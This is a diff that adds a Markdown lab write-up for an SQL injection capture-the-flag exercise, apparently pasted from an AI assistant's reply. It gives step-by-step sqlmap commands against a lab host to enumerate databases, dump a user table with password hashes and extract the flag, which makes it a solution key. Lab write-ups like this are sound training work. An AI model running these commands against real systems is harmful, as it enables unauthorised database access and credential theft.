@@ -535,6 +535,132 @@ Note note = noteService.getById(id);
 ## ✅ Good luck from Kader!
 
 ```
+Here is your lab solution documented in Markdown format (`.md` file content). You can copy and paste this into a file named, for example, `SQL_Injection_Lab_Report.md`.
+
+---
+
+# 🔐 SQL Injection Lab: "Can You Get Access to Secret Recipes?"
+
+## 🧪 Goal
+
+Gain unauthorized access to a database through SQL injection and extract the flag hidden in the `secret` table.
+
+---
+
+## 🖥️ Target URL
+
+```
+
+[http://10.0.2.10/recipe/1](http://10.0.2.10/recipe/1)
+
+````
+
+---
+
+## 🧰 Tools Used
+
+- **sqlmap**: An automated SQL injection and database takeover tool.
+- **Kali/Parrot Terminal** (or any Linux-based terminal)
+
+---
+
+## 🪛 Step-by-Step Execution
+
+### 1. Check for SQL Injection
+
+```bash
+sqlmap -u "http://10.0.2.10/recipe/1*" --batch --level=1 --risk=1
+````
+
+* ✅ SQL Injection confirmed:
+
+  * **Boolean-based blind**
+  * **Time-based blind**
+* ✅ Target DBMS: **MySQL**
+
+---
+
+### 2. Enumerate Databases
+
+```bash
+sqlmap -u "http://10.0.2.10/recipe/1*" --batch --dbs
+```
+
+* 📦 Databases found:
+
+  * `information_schema`
+  * `recipes`
+
+---
+
+### 3. List Tables in `recipes`
+
+```bash
+sqlmap -u "http://10.0.2.10/recipe/1*" --batch -D recipes --tables
+```
+
+* 📂 Tables found:
+
+  * `user`
+  * `recipe`
+  * `secret`
+  * `SPRING_SESSION`
+  * ...and more
+
+---
+
+### 4. Dump `user` Table
+
+```bash
+sqlmap -u "http://10.0.2.10/recipe/1*" --batch -D recipes -T user --dump
+```
+
+* 🧑 Users extracted:
+
+  ```text
+  admin : $2y$12$87sl//ZUdUjmnLqxuaZxou.tut3L8vwGFMD/p9VdilB8qldXzA1Hu
+  user  : $2y$12$vkSxMIK3E9Ec/vNCtmOtuODrSuUcP4BuCF6d1qeLkx8R.3DJiawoi
+  ```
+
+---
+
+### 5. Dump `secret` Table (Find the Flag)
+
+```bash
+sqlmap -u "http://10.0.2.10/recipe/1*" --batch -D recipes -T secret --dump
+```
+
+* 🏁 **Flag Found**:
+
+  ```
+  YT_THE_SQL_INJECTION
+  ```
+
+---
+
+## ✅ Final Result
+
+### 🎯 Flag:
+
+```
+YT_THE_SQL_INJECTION
+```
+
+Mission accomplished ✅
+
+---
+
+## 📁 Logs Location
+
+All SQLMap results saved under:
+
+```
+/home/admin/.sqlmap/output/10.0.2.10/
+```
+
+---
+
+
 
 
 
